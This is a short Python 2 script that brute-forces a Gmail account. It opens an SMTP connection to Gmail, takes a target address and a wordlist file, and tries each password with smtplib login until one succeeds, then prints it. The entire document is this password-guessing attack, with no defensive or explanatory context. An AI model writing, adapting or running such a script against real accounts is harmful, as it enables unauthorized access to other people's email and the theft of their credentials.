import smtplib

print("imported smtplib...")

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
print("choose gmail server")
smtpserver.ehlo()
print("say hello to the server")
smtpserver.starttls()
print("handshake gmail server..")


user = raw_input("Email: ")
passwfile = raw_input("passwd file name: ")
passwfile = open(passwfile, "r")

for password in passwfile:
	try:
		smtpserver.login(user, password)

		print("pw found " + password)
		break;
	except smtplib.SMTPAuthenticationError:
		print("pw wrong " + password)
